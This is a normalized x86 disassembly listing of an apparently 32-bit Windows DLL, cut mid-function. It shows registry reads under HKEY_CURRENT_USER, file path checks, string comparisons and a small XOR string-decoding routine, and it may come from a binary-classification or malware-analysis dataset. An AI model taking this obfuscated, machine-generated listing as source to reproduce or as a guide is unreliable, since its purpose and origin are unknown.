lea esp [ esp ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x318 ]
call sub_100531b0
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x324 ]
push ecx
call [ SysFreeString@IAT ]
lea eax [ ebp - 0x318 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_10036380
cmp [ ebp - 0x304 ] 0x8
jb r-xdata
mov eax [ ebp - 0x31c ]
push eax
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x2fc ]
push ecx
mov ecx [ ebp - 0x31c ]
push ecx
call [ RegCloseKey@IAT ]
lea edx [ ebp - 0x7c ]
push edx
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x7c ]
push edx
mov ecx esi
call sub_100531b0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
push ecx
call sub_1006591f
add esp 0x4
jmp r-xdata
mov ecx esi
call sub_10012920
sub_10002180
push ebp
mov ebp esp
sub esp 0xf0c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0xf0c ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
push edi
lea edx [ ebp - 0xc4 ]
mov eax 0x8
call sub_1002ece0
lea edx [ ebp - 0x10 ]
mov eax 0x7
call sub_1002ece0
lea edx [ ebp - 0x48 ]
mov eax 0x9
call sub_1002ece0
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x8e4 ]
call sub_10041b00
add esp 0xc
lea eax [ ebp - 0xf00 ]
push eax
push 0x20119
push 0x0
mov ecx ebx
mov ebx [ RegOpenKeyExW@IAT ]
push ecx
push 0x80000001
call ebx
test eax eax
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xf00 ]
lea edx [ ebp - 0xf04 ]
push edx
lea eax [ ebp - 0xefc ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
mov [ ebp - 0xf04 ] 0x618
call [ RegQueryValueExW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov edx [ ebp - 0xf00 ]
push edx
call [ RegCloseKey@IAT ]
test edi edi
jne r-xdata
mov edi 0x2
lea eax [ ebp - 0xefc ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
lea eax [ edi + 0x3 ]
call sub_1002ece0
lea ecx [ ebp - 0xf04 ]
push ecx
push 0x20119
push edi
lea edx [ ebp - 0xc4 ]
push edx
push 0x80000001
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0xefc ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edi [ ebp - 0xf04 ]
mov eax 0x30c
call sub_10011360
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0xf04 ]
mov eax 0x6
call sub_1002ece0
lea edx [ ebp - 0xf00 ]
mov eax 0x2
call sub_1002ece0
lea edx [ ebp - 0xf08 ]
xor eax eax
call sub_1002ece0
push edx
push esi
call [ StrStrW@IAT ]
xor edi edi
lea ecx [ ebp - 0x6dc ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
sub esi ecx
lea ecx [ ecx ]
lea ebx [ ebp - 0xf00 ]
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xf0c ]
lea ecx [ ebp - 0xf08 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xf00 ]
push eax
call sub_1003d910
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1003d910
test eax eax
jne r-xdata
lea edx [ ebp - 0xf00 ]
push edx
call sub_1003d910
test eax eax
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xf04 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ ebp - 0xf00 ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
call sub_1003d910
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
mov edx ebx
push edx
lea eax [ ebp - 0xefc ]
push eax
call [ lstrcmpiW@IAT ]
neg eax
pop edi
sbb eax eax
pop ebx
inc eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_100024e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080fa6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi ] r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_1004ccf0
mov eax [ edi + 0x384 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ edi + 0x3a0 ]
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov eax [ edi + 0x3c0 ]
cmp eax esi
je r-xdata
mov ebx [ eax ]
mov [ ebp - 0x18 ] ebx
cmp ebx esi
je r-xdata
mov [ edi + 0x3c0 ] esi
mov [ edi + 0x3c4 ] esi
mov [ edi + 0x3c8 ] esi
mov eax [ edi + 0x3b0 ]
cmp eax esi
je r-xdata
push eax
call sub_1006591f
add esp 0x4
add eax 0x4
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
jne r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax + 0x4 ]
lea edi [ ebx + 0x80 ]
mov [ ebp - 0x24 ] edi
mov [ ecx + edi - 0x60 ] r--data
test [ edi - 0x8 ] 0x1
lea esi [ edi - 0x48 ]
mov [ ebp - 0x28 ] esi
mov [ esi ] r--data
je r-xdata
mov [ edi + 0x3b0 ] esi
mov [ edi + 0x3b4 ] esi
mov [ edi + 0x3b8 ] esi
mov eax [ edi + 0x3a0 ]
cmp eax esi
je r-xdata
mov ebx [ edi + 0x3b4 ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x20 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x30 ]
mov [ edx ] 0x0
mov eax [ esi + 0x14 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x24 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x34 ]
mov [ edx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x6
mov eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ edx ]
push eax
call sub_1006591f
add esp 0x4
mov [ edi + 0x3a0 ] esi
mov [ edi + 0x3a4 ] esi
mov [ edi + 0x3a8 ] esi
cmp [ edi + 0x34 ] 0x10
jb r-xdata
push eax
call sub_1006591f
add esp 0x4
mov ecx [ edi + 0x3b0 ]
push ecx
call sub_1006591f
add esp 0x4
xor esi esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
call sub_1003cdb4
mov [ ebp - 0x4 ] 0x4
mov eax [ esi - 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + esi - 0x18 ] r--data
mov edx [ esi - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
mov ecx [ esi - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + esi - 0x18 ] r--data
push edi
mov [ edi ] r--data
call sub_10058a25
add esp 0x4
mov [ ebp - 0x4 ] 0x3
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
test ecx ecx
je r-xdata
mov [ edi + 0x34 ] 0xf
mov [ edi + 0x30 ] esi
mov [ edi + 0x20 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi + 0x20 ]
push edx
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x24
cmp esi ebx
jne r-xdata
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebx + 0x18 ] 0x7
mov [ ebx + 0x14 ] 0x0
push ebx
mov [ ebx + 0x4 ] cx
call sub_1006591f
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
add esp 0x4
xor esi esi
mov eax [ ebx + 0x4 ]
push eax
call sub_1006591f
add esp 0x4
push eax
call sub_1006591f
add esp 0x4
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100014b7
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x4 ]
neg ebx
sbb ebx ebx
lea ecx [ ebp - 0x20 ]
not ebx
call sub_10050f50
and ebx [ ebp - 0x10 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
dec eax
mov [ ecx + 0x4 ] eax
sub_100027ad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_100027f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080e81
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
add edi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] edi
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_10019180
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov edi [ ebp + 0x8 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0xc ]
je r-xdata
sub_1000287d
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1005e450
add esi 0x24
cmp esi edi
jne r-xdata
sub_100028b0
push 0x8
push r--data
call sub_10079bf0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10002952
push 0xc
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_1005ec92
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000295b
call sub_10079c35
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_10002970
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_100029c0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
lea eax [ ecx * 8 ]
push eax
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_10002a14
push 0x8
push r--data
call sub_10079bf0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10079c35
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10022b5a
pop ecx
push 0xd
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10002b2e
push 0xc
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10002b3a
push esi
call sub_10022b5a
pop ecx
push edi
call sub_1003bd9b
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10022b5a
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1004c42d
pop ecx
sub_10002b50
push ebp
mov ebp esp
push 0xffffffff
push sub_10082a18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x78 ] eax
mov eax [ rw-data ]
mov edi [ eax + 0x4 ]
mov [ ebp - 0x7c ] ecx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x70 ] eax
cmp edi [ eax + 0x8 ]
je r-xdata
xor eax eax
lea ecx [ ecx ]
push esi
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov edx [ edi ]
mov eax ebx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x70 ]
add edi 0x4
cmp edi [ eax + 0x8 ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov eax [ edi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
sub eax esi
sar eax 0x1
push eax
push ebx
lea ecx [ edx + 0x4 ]
call sub_100531b0
mov eax [ edi ]
mov cx [ ebp + 0x10 ]
mov esi [ ebp - 0x78 ]
mov [ eax + 0x3c ] cx
xor ebx ebx
xor edx edx
mov eax esi
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] dx
lea ecx [ eax + 0x2 ]
lea ecx [ ecx ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x50 ]
call sub_100531b0
mov edx [ ebp - 0x7c ]
lea eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] ebx
call sub_10030dc0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_10030dc0
add esp 0x4
mov [ ebp - 0x4 ] 0x2
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
lea ecx [ esi + 0x40 ]
call sub_100531b0
mov esi 0x8
cmp [ ebp - 0x58 ] esi
jb r-xdata
mov esi [ edi ]
mov eax edx
lea ebx [ eax + 0x2 ]
lea ebx [ ebx ]
xor edx edx
mov ebx 0x7
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x6c ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x3c ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ edi ]
mov dl [ ebp + 0x18 ]
xor eax eax
mov [ ecx + 0x3e ] dl
mov edx [ ebp - 0x74 ]
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x50 ] ax
mov eax [ edi ]
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] 0x0
mov [ eax + 0xcc ] ecx
test edx edx
je r-xdata
mov edx [ ebp - 0x50 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x70 ]
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx eax
sub edx ecx
push sub_1005e150
sar edx 0x2
push edx
push eax
push ecx
call sub_10057f80
add esp 0x10
xor eax eax
lea ecx [ ecx ]
mov eax edx
lea esi [ eax + 0x2 ]
lea esp [ esp ]
inc eax
cmp eax 0x11
jb r-xdata
mov eax 0x1
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ edi ]
sub eax esi
sar eax 0x1
push eax
push edx
add ecx 0x20
call sub_100531b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x18
sub_10002d90
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019f17
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10002dc0
mov edx [ edi ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push ebx
lea ebx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_100531b0
mov ecx [ edi + 0x4 ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x20 ] edx
mov eax esi
pop ebx
retn
sub_10002e28
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1005f1a6
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1000977c
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10079b60
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10079b60
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_10022b5a
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1000977c
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10022b5a
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
int3
add edi 0x4
sub_10002f10
push ebp
mov ebp esp
sub esp 0x68c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi edx
mov [ ebp - 0x684 ] ecx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x60 ]
mov eax 0x1
add ecx 0x80000001
mov [ ebp - 0x68c ] ecx
call sub_1006a280
lea edx [ ebp - 0x688 ]
mov eax 0x2
call sub_1006a280
lea edx [ ebp - 0x680 ]
mov eax 0x5
call sub_1006a280
lea edx [ ebp - 0x67c ]
mov eax 0x3
call sub_1006a280
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_1003d910
test eax eax
je r-xdata
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
jne r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_1003d910
test eax eax
jne r-xdata
mov edi [ StrStrW@IAT ]
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x688 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
call sub_1003d910
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
mov edx [ ebp - 0x68c ]
push edx
lea ecx [ ebp - 0x60 ]
call sub_1001b3e0
add esp 0x4
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1000317e
push 0x28
mov eax sub_1007f66a
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_1004db01
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_10055606
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000eae7
jmp r-xdata
sub_10003206
push 0x28
mov eax sub_1007f66a
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_1004db01
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_10055606
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
